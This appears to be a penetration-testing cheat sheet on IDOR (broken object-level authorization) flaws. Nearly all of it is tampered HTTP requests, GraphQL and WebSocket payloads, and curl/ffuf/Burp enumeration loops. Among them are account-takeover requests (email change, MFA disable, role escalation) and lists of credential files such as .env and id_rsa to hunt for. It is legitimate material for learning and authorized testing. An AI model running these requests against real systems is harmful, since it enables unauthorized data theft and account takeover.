# IDOR

## Introduction

IDOR stands for Insecure Direct Object Reference.

It is an access-control vulnerability where the application exposes an object reference and lets the user access, modify, delete, or enumerate that object without correctly enforcing whether the object belongs to the current user.

Modern API terminology often calls the same class of bug BOLA: Broken Object Level Authorization.

Typical impact:

| Type              | Meaning                                                    | Typical Impact                                |
| ----------------- | ---------------------------------------------------------- | --------------------------------------------- |
| Horizontal IDOR   | User A accesses User B's object                            | Data disclosure, account data theft           |
| Vertical IDOR     | Low-privileged user accesses admin-only object             | Privilege escalation                          |
| Write IDOR        | User modifies another user's object                        | Account takeover, fraud, data corruption      |
| Delete IDOR       | User deletes another user's object                         | Destructive unauthorized action               |
| Download IDOR     | User downloads another user's file                         | Invoice, backup, report, document leakage     |
| Multi-Tenant IDOR | User crosses organization or tenant boundary               | B2B data breach                               |
| Blind IDOR        | Response does not show data directly, but behavior changes | Enumeration, state change, side-channel proof |
| BOLA              | API endpoint lacks object-level authorization              | API-wide unauthorized access                  |

---

## Useful Resources

* Incendium — IDOR
* HackTricks — IDOR
* OWASP API Security Top 10 — Broken Object Level Authorization
* PortSwigger Web Security Academy — Access Control
* PayloadsAllTheThings — IDOR
* Burp Suite — Repeater, Intruder, Comparer, Logger
* Burp Extensions — Authorize, Auto Repeater, AuthMatrix, Param Miner
* ffuf
* jq
* httpx
* SecLists

---

## Basic Mental Model

IDOR testing is about asking:

1. What object is being referenced?
2. Where is the object ID located?
3. Can I change the object ID?
4. Does the server enforce ownership or only trust that I am authenticated?
5. Can I read, update, delete, export, approve, invite, or transfer another user's object?
6. Can I enumerate valid object IDs?
7. Can I cross user, role, company, workspace, tenant, project, or organization boundaries?
8. Can encoded, hashed, indirect, or composite IDs be decoded or predicted?

A classic vulnerable pattern:

```http
GET /profile?user_id=1305 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Tampered request:

```http
GET /profile?user_id=1000 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

If User A can see User B's profile, it is IDOR.

High-impact condition:

```text
user-controlled object reference + valid authentication + missing object-level authorization
```

---

## Where to Test

IDOR can appear anywhere an object is referenced.

| Location            | Examples                                           |
| ------------------- | -------------------------------------------------- |
| URL path            | `/users/123`, `/api/orders/987`, `/files/44`       |
| Query string        | `?id=123`, `?user_id=5`, `?invoice=2026-001`       |
| JSON body           | `{"user_id":123}`, `{"account_id":55}`             |
| Form body           | `user_id=123&role=user`                            |
| Headers             | `X-User-ID: 123`, `X-Account-ID: 55`               |
| Cookies             | `uid=123`, `company=44`, `tenant=acme`             |
| JWT claims          | `user_id`, `sub`, `org_id`, `tenant_id`            |
| GraphQL variables   | `{"id":"VXNlcjoxMjM="}`                            |
| WebSocket messages  | `{"type":"getMessage","id":123}`                   |
| Mobile API requests | hidden JSON, protobuf, GraphQL, REST               |
| File URLs           | `/download?id=123`, `/attachments/abc`             |
| Export endpoints    | invoices, reports, backups, CSV, PDF               |
| Admin workflows     | approvals, invites, assignments, ownership changes |

---

## High-Value Parameter Names

```text
id
uid
user
user_id
userid
account
account_id
profile
profile_id
customer
customer_id
client
client_id
tenant
tenant_id
org
org_id
organization
organization_id
company
company_id
workspace
workspace_id
project
project_id
team
team_id
role
role_id
group
group_id
order
order_id
invoice
invoice_id
payment
payment_id
transaction
transaction_id
file
file_id
document
document_id
doc
doc_id
attachment
attachment_id
message
message_id
chat
chat_id
conversation
conversation_id
ticket
ticket_id
case
case_id
report
report_id
export
export_id
backup
backup_id
token
key
uuid
guid
hash
slug
email
username
owner
owner_id
created_by
created_by_id
assigned_to
assignee_id
```

---

## High-Value Endpoint Patterns

```text
/api/user/123
/api/users/123
/api/profile/123
/api/account/123
/api/accounts/123
/api/customer/123
/api/customers/123
/api/order/123
/api/orders/123
/api/invoice/123
/api/invoices/123
/api/payment/123
/api/payments/123
/api/file/123
/api/files/123
/api/document/123
/api/documents/123
/api/attachment/123
/api/attachments/123
/api/download/123
/api/export/123
/api/report/123
/api/reports/123
/api/admin/users/123
/api/tenant/123
/api/org/123
/api/company/123
/api/workspace/123
/api/project/123
/api/message/123
/api/chat/123
/api/conversation/123
```

---

## Test Account Setup

Use at least two normal accounts.

```text
User A: attacker-controlled low-privilege account
User B: attacker-controlled second low-privilege account
Admin: higher-privilege account if explicitly provided
Org A: attacker-controlled organization or tenant
Org B: second organization or tenant if possible
```

Useful test matrix:

| Session         | Object        |
| --------------- | ------------- |
| User A session  | User A object |
| User A session  | User B object |
| User B session  | User A object |
| User A session  | Admin object  |
| User A session  | Org B object  |
| Unauthenticated | User A object |

The core test is simple:

```text
same session + changed object ID = unauthorized access?
```

---

## Baseline Workflow

1. Log in as User A.
2. Create or access an object owned by User A.
3. Capture the request.
4. Log in as User B.
5. Create or access the same object type.
6. Capture User B's object ID.
7. Replay User A's request with User B's object ID.
8. Compare status code, response length, response body, headers, redirect behavior, and application state.
9. Repeat for GET, POST, PUT, PATCH, DELETE, export, download, and action endpoints.
10. Test tenant, organization, workspace, and project IDs separately.

---

## First Manual Probes

### Query ID

```http
GET /api/invoices?id=1001 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Tamper:

```http
GET /api/invoices?id=1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

### Path ID

```http
GET /api/invoices/1001 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Tamper:

```http
GET /api/invoices/1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

### JSON Body ID

```http
POST /api/invoice/view HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"invoice_id":1001}
```

Tamper:

```http
POST /api/invoice/view HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"invoice_id":1002}
```

### Header ID

```http
GET /api/account HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
X-Account-ID: 1001
```

Tamper:

```http
GET /api/account HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
X-Account-ID: 1002
```

### Cookie ID

```http
GET /dashboard HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION; user_id=1001
```

Tamper:

```http
GET /dashboard HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION; user_id=1002
```

---

## Object Types to Hunt

```text
users
profiles
accounts
customers
clients
organizations
tenants
companies
workspaces
projects
teams
groups
roles
permissions
orders
invoices
payments
transactions
subscriptions
licenses
contracts
quotes
leads
tickets
cases
tasks
notes
comments
messages
chats
conversations
notifications
files
attachments
documents
reports
exports
backups
logs
audit events
API keys
tokens
sessions
webhooks
integrations
SSO configurations
OAuth clients
devices
agents
scans
findings
vulnerabilities
```

---

## HTTP Methods to Test

Do not test only `GET`. IDOR frequently appears in state-changing methods.

```text
GET
POST
PUT
PATCH
DELETE
OPTIONS
HEAD
```

Method examples:

```http
GET /api/users/1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

```http
PUT /api/users/1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"display_name":"changed-by-user-a"}
```

```http
PATCH /api/users/1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"phone":"+48123123123"}
```

```http
DELETE /api/documents/1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Use destructive methods only when explicitly allowed.

---

## ID Patterns

### Sequential Integer IDs

```text
1
2
3
4
5
100
101
102
1000
1001
1002
```

### Negative / Zero / Boundary IDs

```text
0
-1
-2
2147483647
2147483648
4294967295
9999999999
```

### UUIDs

```text
550e8400-e29b-41d4-a716-446655440000
550e8400-e29b-41d4-a716-446655440001
550e8400-e29b-41d4-a716-446655440002
```

### MongoDB ObjectId

```text
507f1f77bcf86cd799439011
507f1f77bcf86cd799439012
507f1f77bcf86cd799439013
```

### ULID

```text
01HZX9Y7K3Y4NQ2H9C8Y7G5R4T
01HZX9Y7K3Y4NQ2H9C8Y7G5R4V
```

### Slugs

```text
john-smith
jane-smith
company-a
company-b
invoice-1001
invoice-1002
```

### Emails / Usernames

```text
alice@example.com
bob@example.com
admin@example.com
test@example.com
```

---

## Encoded IDs

Encoded IDs are not authorization.

### Base64

```bash
echo 'MTIz' | base64 -d
```

```bash
echo -n '123' | base64
```

Common examples:

```text
123 -> MTIz
user:123 -> dXNlcjoxMjM=
User:123 -> VXNlcjoxMjM=
account:55 -> YWNjb3VudDo1NQ==
```

### URL Encoding

```bash
python3 - <<'PY'
import urllib.parse
print(urllib.parse.quote("user:123"))
print(urllib.parse.unquote("user%3A123"))
PY
```

### Hex

```bash
echo -n 'C-285-100' | xxd -p
```

```bash
echo '432d3238352d313030' | xxd -r -p
```

### JSON String Encoded in Base64

```bash
echo -n '{"user_id":123,"role":"user"}' | base64 -w0
```

```bash
echo 'eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0=' | base64 -d | jq
```

---

## Hashed IDs

Some IDs are hashes of predictable values.

Common checks:

```bash
echo -n '1' | md5sum
echo -n '2' | md5sum
echo -n '123' | md5sum
```

```bash
echo -n '1' | sha1sum
echo -n '2' | sha1sum
echo -n '123' | sha1sum
```

Generate MD5 candidates:

```bash
for i in $(seq 1 1000); do
  printf "%s " "$i"
  echo -n "$i" | md5sum | awk '{print $1}'
done
```

Generate SHA1 candidates:

```bash
for i in $(seq 1 1000); do
  printf "%s " "$i"
  echo -n "$i" | sha1sum | awk '{print $1}'
done
```

Test pattern:

```text
your_object_id = md5(123)
other_object_id = md5(124)
```

---

## JWT-Adjacent IDOR

JWTs often reveal user, tenant, organization, or role claims.

Decode JWT locally:

```bash
python3 - <<'PY'
import base64, json, os

jwt = os.environ.get("JWT", "")
header, payload, signature = jwt.split(".")
def b64url_decode(data):
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data)

print(json.dumps(json.loads(b64url_decode(header)), indent=2))
print(json.dumps(json.loads(b64url_decode(payload)), indent=2))
PY
```

Run:

```bash
export JWT='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJ1c2VyX2lkIjoxMjMsIm9yZ19pZCI6NTV9.signature'
python3 jwt_decode.py
```

Look for object references:

```text
sub
uid
user_id
account_id
customer_id
tenant_id
org_id
company_id
role
scope
permissions
```

Test whether the API trusts IDs in request parameters over IDs in the token.

---

## GraphQL IDOR

GraphQL commonly exposes global IDs, base64 IDs, node IDs, and object-specific queries.

### Introspection Probe

```graphql
query {
  __schema {
    queryType {
      fields {
        name
      }
    }
  }
}
```

### Node Query

```graphql
query {
  node(id: "VXNlcjoxMjM=") {
    id
    ... on User {
      email
      name
    }
  }
}
```

### Decode Relay-Style Global ID

```bash
echo 'VXNlcjoxMjM=' | base64 -d
```

### Encode New Relay-Style ID

```bash
echo -n 'User:124' | base64
```

### Object Query

```graphql
query {
  invoice(id: "1002") {
    id
    number
    total
    email
  }
}
```

### Mutation IDOR

```graphql
mutation {
  updateInvoice(id: "1002", input: {notes: "changed-by-user-a"}) {
    id
    notes
  }
}
```

GraphQL targets:

```text
node(id:)
user(id:)
account(id:)
invoice(id:)
order(id:)
file(id:)
document(id:)
organization(id:)
tenant(id:)
project(id:)
workspace(id:)
updateUser
updateAccount
deleteFile
downloadDocument
```

---

## REST API IDOR

### Read Object

```http
GET /api/v1/users/1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

### Update Object

```http
PATCH /api/v1/users/1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"display_name":"changed-by-user-a"}
```

### Nested Object

```http
GET /api/v1/users/1001/invoices/5002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Tamper parent and child separately:

```http
GET /api/v1/users/1002/invoices/5002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

```http
GET /api/v1/users/1001/invoices/5003 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

```http
GET /api/v1/users/1002/invoices/5003 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

---

## Multi-Tenant IDOR

Multi-tenant applications often check login but fail tenant boundary checks.

Test IDs independently:

```text
user_id
tenant_id
org_id
company_id
workspace_id
project_id
team_id
account_id
```

Example:

```http
GET /api/orgs/55/users/1001 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Tamper organization:

```http
GET /api/orgs/56/users/1001 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Tamper user:

```http
GET /api/orgs/55/users/1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Tamper both:

```http
GET /api/orgs/56/users/1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

High-value multi-tenant objects:

```text
billing
invoices
contracts
users
roles
API keys
SSO configuration
integrations
webhooks
audit logs
reports
exports
backups
devices
agents
vulnerability scans
```

---

## Download IDOR

Download endpoints are high-value because they often expose files directly.

### Query ID

```http
GET /download.php?id=1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

### Path ID

```http
GET /api/files/1002/download HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

### Filename + Username

```http
GET /view.php?username=alice&file=invoice.pdf HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Tamper username:

```http
GET /view.php?username=bob&file=invoice.pdf HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Interesting filenames:

```text
invoice.pdf
invoices.pdf
report.pdf
backup.zip
database.zip
config.zip
contract.pdf
export.csv
users.csv
passwords.xlsx
settings.json
.env
id_rsa
```

---

## Export IDOR

Export endpoints often create downloadable reports asynchronously.

```http
POST /api/reports/export HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"user_id":1002,"format":"csv"}
```

```http
POST /api/invoices/export HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"account_id":55,"from":"2026-01-01","to":"2026-12-31","format":"pdf"}
```

```http
GET /api/exports/9002/download HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Test both:

```text
object that export is created for
export job ID after creation
download ID after export completion
```

---

## Object Ownership Override

Some APIs accept ownership fields in the body.

```http
POST /api/documents HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"title":"test","owner_id":1002,"content":"test"}
```

```http
PATCH /api/documents/5001 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"owner_id":1002}
```

```http
POST /api/projects/3001/invite HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"user_id":1002,"role":"admin"}
```

High-value ownership fields:

```text
owner
owner_id
user_id
account_id
customer_id
tenant_id
org_id
company_id
created_by
created_by_id
assigned_to
assignee_id
role
role_id
group_id
team_id
workspace_id
project_id
```

---

## List-to-Object Gap

A common pattern:

```text
/list endpoint is filtered correctly
/object endpoint is not filtered correctly
```

Example:

```http
GET /api/invoices HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Response:

```json
[
  {"id":1001,"number":"INV-1001"}
]
```

Direct object tamper:

```http
GET /api/invoices/1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

If direct access works even though the object was not in the list, it is IDOR.

---

## Action IDOR

Do not only test object reads. Test actions.

```text
approve
reject
cancel
refund
delete
restore
archive
unarchive
assign
unassign
invite
remove
promote
demote
reset
resend
verify
download
export
transfer
share
unshare
clone
publish
unpublish
```

Example:

```http
POST /api/invoices/1002/approve HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

```http
POST /api/users/1002/reset-password HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

```http
POST /api/projects/3002/invite HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"email":"attacker@example.com","role":"admin"}
```

---

## Blind IDOR

Blind IDOR occurs when the response does not reveal the object directly, but the object state changes.

Signals:

```text
status code changes
response length changes
timing changes
email is sent
notification is created
audit log is updated
object count changes
download job is created
export job appears
webhook fires
admin panel state changes
```

Blind test example:

```http
POST /api/documents/1002/share HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"email":"attacker@example.com"}
```

Then check:

```text
attacker receives email
document appears in shared list
notification appears
audit event appears
```

---

## Error-Response Oracle

Different errors can reveal valid users, files, tenants, or documents.

Example target:

```text
/view.php?username=alice&file=test.pdf
```

Possible responses:

```text
User not found
File does not exist
Invalid file extension
Access denied
```

ffuf username oracle:

```bash
ffuf -u 'https://target.example/view.php?username=FUZZ&file=test.pdf' \
  -H 'Cookie: session=USER_A_SESSION' \
  -w /usr/share/seclists/Usernames/Names/names.txt \
  -fr 'User not found'
```

ffuf file oracle:

```bash
ffuf -u 'https://target.example/view.php?username=alice&file=FUZZ' \
  -H 'Cookie: session=USER_A_SESSION' \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -fr 'File does not exist'
```

---

## Sequential ID Enumeration

### curl Loop

```bash
export TARGET='https://target.example'
export COOKIE='session=USER_A_SESSION'

for id in $(seq 1 1000); do
  code=$(curl -sk -o /tmp/idor_body -w '%{http_code}' \
    -H "Cookie: $COOKIE" \
    "$TARGET/api/invoices/$id")
  size=$(wc -c < /tmp/idor_body)
  echo "$id $code $size"
done
```

### Filter Interesting Responses

```bash
export TARGET='https://target.example'
export COOKIE='session=USER_A_SESSION'

for id in $(seq 1 1000); do
  body=$(curl -sk -H "Cookie: $COOKIE" "$TARGET/api/invoices/$id")
  echo "$body" | jq -e '.id' >/dev/null 2>&1 && echo "hit: $id"
done
```

### Save Hits

```bash
export TARGET='https://target.example'
export COOKIE='session=USER_A_SESSION'

mkdir -p idor_hits

for id in $(seq 1 1000); do
  curl -sk -H "Cookie: $COOKIE" "$TARGET/api/invoices/$id" -o "idor_hits/$id.json"
  grep -qiE 'invoice|email|total|amount|customer' "idor_hits/$id.json" && echo "possible hit: $id"
done
```

---

## ffuf ID Enumeration

### Numeric Path ID

```bash
seq 1 1000 > ids.txt

ffuf -u 'https://target.example/api/invoices/FUZZ' \
  -H 'Cookie: session=USER_A_SESSION' \
  -w ids.txt \
  -mc all \
  -of json \
  -o idor_ffuf.json
```

### Numeric Query ID

```bash
seq 1 1000 > ids.txt

ffuf -u 'https://target.example/download.php?id=FUZZ' \
  -H 'Cookie: session=USER_A_SESSION' \
  -w ids.txt \
  -mc all \
  -of json \
  -o downloads_ffuf.json
```

### Filter by Response Text

```bash
seq 1 1000 > ids.txt

ffuf -u 'https://target.example/download.php?id=FUZZ' \
  -H 'Cookie: session=USER_A_SESSION' \
  -w ids.txt \
  -fr 'File Not Found' \
  -of json \
  -o downloads_hits.json
```

### Extract Hit URLs

```bash
jq -r '.results[].url' downloads_hits.json
```

---

## Combinatorial IDOR

Some endpoints accept two or more IDs.

Example:

```text
/chat.php?chat_users[0]=1&chat_users[1]=2
```

ffuf cluster bomb:

```bash
seq 1 100 > ids.txt

ffuf -u 'https://target.example/chat.php?chat_users[0]=NUM1&chat_users[1]=NUM2' \
  -H 'Cookie: session=USER_A_SESSION' \
  -w ids.txt:NUM1 \
  -w ids.txt:NUM2 \
  -ac \
  -of json \
  -o chats.json
```

Remove symmetric duplicates:

```bash
jq -r '.results[] | select((.input.NUM1|tonumber) < (.input.NUM2|tonumber)) | .url' chats.json
```

Other combinatorial pairs:

```text
user_id + file_id
org_id + user_id
project_id + task_id
workspace_id + document_id
account_id + invoice_id
conversation_id + message_id
team_id + member_id
```

---

## Burp Repeater Workflow

1. Capture a valid request for User A.
2. Send to Repeater.
3. Change only one object reference.
4. Keep User A cookie/token unchanged.
5. Send.
6. Compare against original response.
7. Switch to User B object ID.
8. Test path, query, body, headers, and cookies.
9. Repeat with other HTTP methods.
10. Repeat with nested parent/child IDs.

Good Repeater tabs:

```text
User A original
User B original
User A session + User B object
Unauthenticated + User A object
User A session + random object
User A session + admin object
```

---

## Burp Intruder Workflow

Payload positions:

```http
GET /api/invoices/§1001§ HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Payload list:

```text
1
2
3
4
5
100
101
102
1000
1001
1002
```

Grep match:

```text
email
invoice
amount
total
phone
address
token
download
```

Grep extract:

```text
"user_id":123
"email":"user@example.com"
"id":1002
```

Useful filters:

```text
status != 403
status != 404
length != baseline
contains email
contains JSON key
contains PDF header
contains ZIP header
```

---

## Burp Authorize Workflow

1. Install Authorize.
2. Add low-privilege User A session.
3. Browse as User B or Admin.
4. Let Authorize replay requests using User A credentials.
5. Review responses where User A receives the same or similar response as the privileged user.
6. Manually validate every hit in Repeater.

High-value Authorize findings:

```text
same status code
same response length
same JSON keys
same file download
same object content
state-changing action succeeds
```

---

## Auto Repeater Workflow

Use Auto Repeater when multiple sessions are available.

Session pairs:

```text
Admin request -> replay as User A
User B request -> replay as User A
Org B request -> replay as Org A user
Authenticated request -> replay unauthenticated
```

Compare:

```text
status code
response length
JSON structure
sensitive fields
location header
download content
state change
```

---

## Postman / API Collection Testing

API collections often expose hidden object references.

Search collection for:

```text
:id
{id}
userId
user_id
accountId
account_id
tenantId
tenant_id
orgId
org_id
invoiceId
invoice_id
fileId
file_id
```

Export variables to test:

```json
{
  "user_id": "1001",
  "other_user_id": "1002",
  "account_id": "55",
  "other_account_id": "56",
  "invoice_id": "5001",
  "other_invoice_id": "5002"
}
```

Then replay requests with User A token and User B object IDs.

---

## Mobile API IDOR

Mobile apps often expose object references in JSON, GraphQL, protobuf, or hidden API routes.

Testing flow:

1. Proxy the app through Burp.
2. Create User A object.
3. Create User B object.
4. Compare API traffic.
5. Search for IDs in request and response bodies.
6. Replay User A session with User B IDs.
7. Test background sync, notifications, attachments, and exports.

High-value mobile endpoints:

```text
/api/me
/api/profile
/api/users
/api/messages
/api/conversations
/api/orders
/api/wallet
/api/cards
/api/documents
/api/attachments
/api/sync
/api/export
/api/notifications
```

---

## WebSocket IDOR

WebSocket messages may contain object IDs.

Example message:

```json
{"type":"get_conversation","conversation_id":1001}
```

Tamper:

```json
{"type":"get_conversation","conversation_id":1002}
```

Other messages:

```json
{"type":"get_message","message_id":5002}
```

```json
{"type":"subscribe","channel":"user:1002"}
```

```json
{"type":"join","room_id":3002}
```

```json
{"type":"delete_message","message_id":5002}
```

Look for:

```text
subscription to another user's channel
message history leakage
typing events
presence events
notification leakage
state-changing actions
```

---

## IDOR in Password Reset / Account Recovery

Test carefully with owned accounts.

```http
POST /api/password-reset/request HTTP/1.1
Host: target.example
Content-Type: application/json

{"user_id":1002}
```

```http
POST /api/password-reset/verify HTTP/1.1
Host: target.example
Content-Type: application/json

{"user_id":1002,"code":"123456"}
```

```http
POST /api/users/1002/change-email HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"email":"attacker@example.com"}
```

```http
POST /api/users/1002/mfa/disable HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

High-impact targets:

```text
change email
change phone
disable MFA
reset password
generate recovery code
view backup codes
resend verification
verify account
link OAuth provider
unlink OAuth provider
```

---

## IDOR in Invitations and Sharing

```http
POST /api/projects/3002/invitations HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"email":"attacker@example.com","role":"admin"}
```

```http
POST /api/documents/5002/share HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"email":"attacker@example.com","permission":"edit"}
```

```http
PATCH /api/invitations/7002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"role":"owner"}
```

Interesting objects:

```text
project invitations
workspace invitations
organization invites
document shares
folder shares
calendar shares
repository collaborators
integration users
admin roles
billing users
```

---

## IDOR in Admin Functions

Low-privilege users may access admin endpoints if only the UI hides links.

```http
GET /api/admin/users/1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

```http
PATCH /api/admin/users/1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"role":"admin"}
```

```http
POST /api/admin/users/1002/impersonate HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Admin object references:

```text
users
roles
permissions
groups
tenants
organizations
licenses
billing
audit logs
sessions
API keys
SSO
OAuth apps
webhooks
integrations
backups
exports
```

---

## IDOR in Object Storage

Object storage URLs may expose object keys.

Example:

```text
https://cdn.target.example/uploads/users/1001/avatar.png
```

Tamper:

```text
https://cdn.target.example/uploads/users/1002/avatar.png
```

Interesting key patterns:

```text
/users/1001/avatar.png
/users/1002/avatar.png
/accounts/55/invoice.pdf
/accounts/56/invoice.pdf
/orgs/55/reports/export.csv
/orgs/56/reports/export.csv
/private/1001/document.pdf
/private/1002/document.pdf
```

Check:

```text
direct object access
signed URL reuse
predictable object keys
tenant ID in path
user ID in path
export IDs
backup IDs
public CDN caching
```

---

## Signed URL IDOR

Signed URLs can still have IDOR if the API that generates them accepts arbitrary object IDs.

```http
POST /api/files/sign HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"file_id":1002}
```

```http
POST /api/reports/signed-url HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"report_id":9002}
```

Check whether the generated URL downloads another user's file.

---

## IDOR in Search and Filters

Search endpoints may accept owner filters.

```http
GET /api/search?user_id=1002&q=invoice HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

```http
GET /api/documents?owner_id=1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

```http
GET /api/audit?org_id=56 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Filter fields:

```text
user_id
owner_id
account_id
tenant_id
org_id
company_id
project_id
workspace_id
created_by
assigned_to
shared_with
```

---

## IDOR in Pagination

Pagination can leak objects if filters are weak.

```http
GET /api/invoices?page=1&limit=100&user_id=1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

```http
GET /api/invoices?offset=0&limit=100&account_id=56 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

```http
GET /api/invoices?cursor=eyJ1c2VyX2lkIjoxMDAyfQ== HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Decode cursor:

```bash
echo 'eyJ1c2VyX2lkIjoxMDAyfQ==' | base64 -d | jq
```

---

## IDOR in Batch APIs

Batch endpoints often process IDs without per-object checks.

```http
POST /api/documents/batch HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"ids":[1001,1002,1003]}
```

```http
POST /api/files/download-bulk HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"file_ids":[5001,5002,5003]}
```

```http
POST /api/users/bulk-update HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"user_ids":[1002],"status":"active"}
```

Test mixed lists:

```text
one owned ID + one unowned ID
only unowned IDs
valid ID + invalid ID
admin ID + normal user ID
cross-tenant IDs
```

---

## Content-Type Confusion

Same endpoint may parse different body formats.

### JSON

```http
POST /api/invoice/view HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"invoice_id":1002}
```

### Form

```http
POST /api/invoice/view HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/x-www-form-urlencoded

invoice_id=1002
```

### Multipart

```http
POST /api/invoice/view HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: multipart/form-data; boundary=----idor

------idor
Content-Disposition: form-data; name="invoice_id"

1002
------idor--
```

---

## Parameter Pollution

Backend frameworks may choose first, last, or all duplicated parameters.

```http
GET /api/invoice?id=1001&id=1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

```http
POST /api/invoice/view HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/x-www-form-urlencoded

id=1001&id=1002
```

```http
POST /api/invoice/view HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"id":1001,"id":1002}
```

---

## Case and Name Confusion

Try equivalent field names.

```json
{"user_id":1002}
```

```json
{"userId":1002}
```

```json
{"userid":1002}
```

```json
{"UserId":1002}
```

```json
{"USER_ID":1002}
```

```json
{"owner_id":1002}
```

```json
{"created_by":1002}
```

```json
{"account":{"id":1002}}
```

```json
{"user":{"id":1002}}
```

---

## Mass Assignment Adjacent to IDOR

Mass assignment can turn into IDOR when ownership fields are accepted.

```http
PATCH /api/profile HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{
  "display_name": "user-a",
  "user_id": 1002,
  "role": "admin",
  "tenant_id": 56
}
```

Fields to try:

```text
id
user_id
uid
owner_id
account_id
tenant_id
org_id
company_id
role
role_id
is_admin
admin
permission
permissions
plan
status
verified
mfa_enabled
email_verified
```

---

## Race and State IDOR

Some actions are authorized at creation but not at completion.

Example flow:

```text
create export job for User A
change job_id to User B export
download job result
```

```http
POST /api/exports HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
Content-Type: application/json

{"account_id":55,"type":"invoices"}
```

```http
GET /api/exports/9002/status HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

```http
GET /api/exports/9002/download HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

Test:

```text
job creation object ID
job status ID
job result ID
download ID
temporary file ID
notification ID
```

---

## IDOR with Cache

Caches can expose another user's object after one user loads it.

Test sequence:

```text
User B loads object 1002
User A requests object 1002
User A receives cached object
```

Headers to inspect:

```text
Cache-Control
ETag
Vary
Age
X-Cache
CF-Cache-Status
X-Served-By
